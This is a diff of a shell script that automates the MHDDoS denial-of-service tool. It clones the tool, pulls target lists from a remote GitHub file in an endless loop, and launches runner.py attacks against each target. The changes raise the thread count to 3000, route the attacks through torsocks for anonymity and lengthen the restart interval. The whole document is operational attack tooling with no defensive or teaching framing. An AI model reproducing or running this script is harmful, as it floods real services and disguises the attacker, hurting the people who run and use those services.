@@ -15,11 +15,10 @@ cd mhddos_proxy
 #curl -o proxies_config.json https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json 
 git clone https://github.com/MHProDev/MHDDoS.git
 
-#threads="${1:-1000}"; threads="-t $threads"
+threads="${1:-3000}"; threads="-t $threads"
 rpc="--rpc 2000"
 proxy_upd="-p 3600"
 debug="--debug"
-table="--table"
 
 # Restart attacks and update targets every 15 minutes
 while true
@@ -35,7 +34,7 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            python3 ~/mhddos_proxy/runner.py $cmd_line $rpc $proxy_upd $debug $table&
+            torsocks python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
       done
-sleep 15m
+sleep 30m
 done
